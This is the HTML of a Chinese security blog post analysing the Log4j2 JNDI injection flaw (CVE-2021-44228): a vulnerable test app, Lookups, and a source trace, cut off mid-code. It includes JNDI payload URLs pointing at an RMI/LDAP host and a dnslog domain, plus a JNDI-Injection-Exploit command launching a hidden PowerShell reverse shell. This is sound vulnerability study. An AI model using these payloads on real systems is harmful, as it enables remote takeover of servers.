@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="# Log4j2系列漏洞  这个是8月份在电网上班遇上的一种攻击，感觉有点意思就想着来搞一搞  参考：[https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zpchcbd&#x2F;p&#x2F;16200105.html](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zpchcbd&#x2F;p&#x2F;16200105.html)  # 远程代码执行漏洞和复现  即CVE-2021-44228  ## 关于log4j2  是Ap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2系列漏洞">
+<meta property="og:url" content="http://example.com/2026/09/16/20-Log4j2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Glut4micum">
+<meta property="og:description" content="# Log4j2系列漏洞  这个是8月份在电网上班遇上的一种攻击，感觉有点意思就想着来搞一搞  参考：[https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zpchcbd&#x2F;p&#x2F;16200105.html](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;zpchcbd&#x2F;p&#x2F;16200105.html)  # 远程代码执行漏洞和复现  即CVE-2021-44228  ## 关于log4j2  是Ap">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-16T13:59:09.000Z">
+<meta property="article:modified_time" content="2026-09-16T13:59:09.000Z">
+<meta property="article:author" content="谷氨酸棒状杆菌">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/09/16/20-Log4j2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Log4j2系列漏洞 | Glut4micum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Glut4micum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/09/16/20-Log4j2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+      <meta itemprop="name" content="谷氨酸棒状杆菌">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glut4micum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Log4j2系列漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-09-16 21:59:09" itemprop="dateCreated datePublished" datetime="2026-09-16T21:59:09+08:00">2026-09-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">知识笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="本文总阅读两 fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        
+# Log4j2系列漏洞
+
+这个是8月份在电网上班遇上的一种攻击，感觉有点意思就想着来搞一搞
+
+参考：[https://www.cnblogs.com/zpchcbd/p/16200105.html](https://www.cnblogs.com/zpchcbd/p/16200105.html)
+
+# 远程代码执行漏洞和复现
+
+即CVE-2021-44228
+
+## 关于log4j2
+
+是Apache的一个开源项目，是Java应用常见的开源日志库，是一个Java的日志记录工具，在log4j框架的基础上进行了改进，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等
+
+## JNDI
+
+全称为Java命名和目录接口，是它的英文缩写，相当于一个映射字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。JNDI注入攻击常用的就是通过RMI和LDAP两种服务，参考文章，使用LDAP服务为例复现。
+
+## lig4j2的Lookups功能
+
+官网地址：
+
+[bookmarklink]
+
+提供了一种在Log4j2配置文件任意位置添加值的方法，他们是实现StrLookup接口的特定类型的插件。
+
+## 远程执行漏洞原理
+
+log4j2框架下的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）
+
+​
+
+​
+
+# [Log4j2系列漏洞分析](https://www.cnblogs.com/zpchcbd/p/16200105.html)
+
+前言：Log4j2 jndi注入分析学习笔记
+
+- log4j2 CVE-2021-44228漏洞复现
+- log4j2 CVE-2021-44228造成的原因
+- log4j2 一些payload如何绕过防火墙的原理
+- log4j2修复后的2.15.0 rc1补丁绕过问题
+- log4j2的拒绝服务攻击
+- log4j2的2.15.0版本(rc1/rc2之后)的RCE
+
+# 关于log4j2
+
+Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。
+
+log4j2的介绍，Apache Log4j 2是对Log4j的升级，它比其前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，同时修复了Logback架构中的一些问题。是目前最优秀的Java日志框架之一。
+
+# log4j2和log4j的区别
+
+参考文章：[https://blog.csdn.net/jidunkeji/article/details/122132141](https://blog.csdn.net/jidunkeji/article/details/122132141)
+
+- Log4j2分为2个jar包，一个是接口log4j-api-${版本号}.jar，一个是具体实现log4j-core-${版本号}.jar，而Log4j只有一个jar包log4j-${版本号}.jar
+
+![image](/yuque-notes/02-Knowledge Book/assets/2b7ad8ee-1586953-20220428094952653-282586740.png)
+
+- Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。
+
+![image](/yuque-notes/02-Knowledge Book/assets/d117fd17-1586953-20220428095034255-1697391785.png)
+
+- Log4j2的package名称前缀为org.apache.logging.log4j。Log4j的package名称前缀为org.apache.log4j。
+
+![image](/yuque-notes/02-Knowledge Book/assets/736ade95-1586953-20220428095025329-1551878088.png)
+
+# log4j2 jndi注入复现
+
+这里搭建的环境是通过spring boot来进行搭建的，然后pom配置如下
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 排除掉logging，不使用logback，改用log4j2 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+这里的一个HelloController.java
+
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> final <span class="title class_">Logger</span> mLogger = <span class="title class_">LogManager</span>.<span class="title function_">getLogger</span>(<span class="title class_">HelloController</span>.<span class="property">class</span>);</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">&quot;/test&quot;</span>, method = <span class="title class_">RequestMethod</span>.<span class="property">GET</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">String</span> <span class="title function_">log4j_test01</span>(<span class="params"><span class="meta">@RequestParam</span>(value = <span class="string">&quot;username&quot;</span>)<span class="built_in">String</span> username</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        mLogger.<span class="title function_">error</span>(username);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this_is_test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+![image](/yuque-notes/02-Knowledge Book/assets/7d9b1b6b-1586953-20220428111133821-1693350892.png)
+
+触发点就是一个username的参数，这里搭建好对应的RMI或者LDAP的服务器来进行jndi注入测试，测试效果如下
+
+访问：`http://www.test.com:8080/test?username=${jndi:rmi://172.20.10.2:1099/nz4zwd}`
+
+![image](/yuque-notes/02-Knowledge Book/assets/b03389de-1586953-20220428111611813-446538970.png)
+
+![image](/yuque-notes/02-Knowledge Book/assets/745177f1-1586953-20220428111608789-1295240819.png)
+
+反弹shell的操作：`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "powershell.exe -nop -w hidden -e base64编码" -A "172.20.10.2"`
+
+# 关于log4j2的Lookups功能
+
+在分析学习log4j2的jndi注入之前，这里先来了解下关于log4j2的Lookups功能
+
+log4j2的文档地址为：[https://logging.apache.org/log4j/2.x/manual/lookups.html](https://logging.apache.org/log4j/2.x/manual/lookups.html)
+
+Lookups提供了一种在Log4j配置文件任意位置添加值的方法。它们是实现StrLookup接口的特定类型的插件。
+
+![image](/yuque-notes/02-Knowledge Book/assets/bf0de2ad-1586953-20221016155819626-366688076.png)
+
+就比如这里测试Java的Lookup，以`java:`为前缀即可被Java的Lookups对象来进行解析，如下代码所示
+
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Log4jController</span> </span>&#123;</span><br><span class="line">    private <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Log4jController.<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;<span class="subst">$&#123;java:version&#125;</span>&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;<span class="subst">$&#123;java:vm&#125;</span>&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;<span class="subst">$&#123;java:runtime&#125;</span>&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;<span class="subst">$&#123;java:locale&#125;</span>&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;<span class="subst">$&#123;java:hw&#125;</span>&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;<span class="subst">$&#123;java:os&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+可以看到运行之后罗列出了java相关的环境信息
+
+![image](/yuque-notes/02-Knowledge Book/assets/97daef94-1586953-20220428135227687-82177735.png)
+
+同样的这里也提供了对JNDI的支持，比如`${jndi:logging/context-name}`
+
+我们这里改成`${jndi:rmi://}`来进行测试，如下所示
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">static</span> <span class="keyword">final</span> Logger logger = LogManager.<span class="built_in">getLogger</span>(Log4jController.<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.<span class="built_in">error</span>(<span class="string">&quot;$&#123;jndi:ldap://log4j.y3fcsa.dnslog.cn/&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+可以看到，jndi的请求成功的发出来了，那么这里如果没有经过相关的过滤的话，那么自然就可以进行JNDI注入实现命令执行的操作了
+
+![image](/yuque-notes/02-Knowledge Book/assets/d17fef0a-1586953-20220428140513751-677786916.png)
+
+# CVE-2021-44228分析
+
+这里来分析`logger.error("${jndi:ldap://log4j.y3fcsa.dnslog.cn/}");`的流程，首先还是打一个断点，然后进行分析跟踪
+
+![image](/yuque-notes/02-Knowledge Book/assets/adbcdfe9-1586953-20220428141114249-568730307.png)
+
+先来到logIfEnabled它会判断是否支持log记录
+
+![image](/yuque-notes/02-Knowledge Book/assets/d897d482-1586953-20220428141223591-1555592728.png)
+
+接着继续跟进来到log:457, LoggerConfig的log的方法，它会通过createEvent方法来将当前的记录的信息封装成一个LogEvent对象，用于之后的处理
+
+![image](/yuque-notes/02-Knowledge Book/assets/20739afd-1586953-20220428141414095-466383245.png)
+
+![image](/yuque-notes/02-Knowledge Book/assets/714f07fb-1586953-20220428141512866-1740702946.png)
+
+接着在LoggerConfig中的log方法中执行processLogEvent方法
+
+![image](/yuque-notes/02-Knowledge Book/assets/1107db41-1586953-20220428141619371-1888487684.png)
+
+接着会调用LoggerConfig中的callAppenders方法
+
+![image](/yuque-notes/02-Knowledge Book/assets/1ea0a86f-1586953-20220428141657929-339202954.png)
+
+关于什么是Appenders：Appender负责将日志事件传递到其目标。每个Appender都必须实现Appender接口。大多数Appender将扩展AbstractAppender，它添加了生命周期和可过滤的支持。生命周期允许组件在配置完成后完成初始化，并在关闭期间执行清理。Filterable允许组件附加过滤器，在事件处理期间对其进行评估。
+
+![image](/yuque-notes/02-Knowledge Book/assets/7ddfb1e6-1586953-20220428141900675-1043187716.png)
+
+接着一直跟，中间都是Append的处理过程，这里说继续来到encode:59, PatternLayout (org.apache.logging.log4j.core.layout)，下面是参考的堆栈调用
+
+encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
+directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
+tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
+append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
+tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
+callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
+callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
+callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
+callAppenders:543, LoggerConfig (org.apache.logging.log4j.core.config)
+processLogEvent:502, LoggerConfig (org.apache.logging.log4j.core.config)
+..
+
+org/apache/logging/log4j/core/layout/PatternLayout.java对象提供了序列化数据的操作，encode方法中，到这里的toText方法就会开始序列化数据
+
+![image](/yuque-notes/02-Knowledge Book/assets/27573e5c-1586953-20220428144855722-1513420896.png)
+
+totext方法定义如下
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">toText</span><span class="params">(<span class="keyword">final</span> Serializer2 serializer, <span class="keyword">final</span> LogEvent event,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">final</span> StringBuilder destination)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serializer.<span class="built_in">toSerializable</span>(event, destination);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+这里会通过PatternFormatter对象来对生成的日志模板和数据来进行格式化，用到的PatternFormatter对象有如下
+
+![image](/yuque-notes/02-Knowledge Book/assets/53ceaf26-1586953-20220428145342284-1026265524.png)
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DatePatternConverter</span><br><span class="line">LiteralPatternConverter</span><br><span class="line">ThreadNamePatternConverter</span><br><span class="line">LiteralPatternConverter</span><br><span class="line">LevelPatternConverter</span><br><span class="line">LiteralPatternConverter</span><br><span class="line">LoggerPatternConverter</span><br><span class="line">LiteralPatternConverter</span><br><span class="line">MessagePatternConverter - 这里是触发点</span><br><span class="line">LineSeparatorPatternConverter</span><br><span class="line">ExtendedThrowablePatternConverter</span><br></pre></td></tr></table></figure>
+
+每个Formatter对象都会进行对进行format方法的操作，如下图所示
+
+就比如DatePatternConverter，它会格式化一个日期存储到buf中，LiteralPatternConverter就是格式化一个`[]`符号
+
+![image](/yuque-notes/02-Knowledge Book/assets/8afff5f5-1586953-20220428150150698-572612099.png)
+
+对数据的格式化是在MessagePatternConverter，所以触发点也是在MessagePatternConverter，这里直接跟到MessagePatternConverter的format函数中
+
+![image](/yuque-notes/02-Knowledge Book/assets/1a3a07ea-1586953-20220428150738254-1114177194.png)
+
+它首先在在当前日志输出的报错数据进行格式化到buf中，此时的数据为如下所示
+
+![image](/yuque-notes/02-Knowledge Book/assets/07525364-1586953-20220428150926438-1230562117.png)
+
+再接着就会来到下面这个位置，首先它会判断`if (config != null && !noLookups) {`，是否config不为空，并且noLookups是为false的
+
+然后它会判断报错的数据`zxczxczxczxc${xxxx}zxzxczxczc`中是否是存在`${`，如果是的话它就会执行`workingBuilder.append(config.getStrSubstitutor().replace(event, value));`
+
+首先会执行config.getStrSubstitutor()，获取一个StrSubstitutor的对象
+
+StrSubstitutor({date, ctx, main, sys, env, sd, java, marker, jndi, jvmrunargs, bundle, map, log4j})
+
+![image](/yuque-notes/02-Knowledge Book/assets/6513eb5b-1586953-20220428151703228-994050443.png)
+
+再接着就是执行replace方法，其中会执行substitute方法
+
+![image](/yuque-notes/02-Knowledge Book/assets/15ebad50-1586953-20220428151740765-1330865229.png)
+
+首先就是初始化完之后要对该数据进行匹配要用的对象
+
+![image](/yuque-notes/02-Knowledge Book/assets/609bf1c4-1586953-20220428151836416-1476692852.png)
+
+然后来对这一段带有`${xxxx}`的数据进行相关的操作
+
+- 通过prefixMatcher.isMatch来匹配${ -> found variable start marker
+- 通过suffixMatcher.isMatch来匹配} -> found variable end marker
+- 如果上面都符合的话，那么还会递归调用上一次的${xxxxx}，把其中的去除${ 和 }的之间的内容作为substitute的参数进行调用
+- 检查是否存在:-，存在的话则进行分割（用于绕过waf使用）
+- 最终的内容通过:符号来切分获取一个对应的lookup对象，如果是jndi:xxxx的话，那么就是获取的是jndi的lookup对象
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 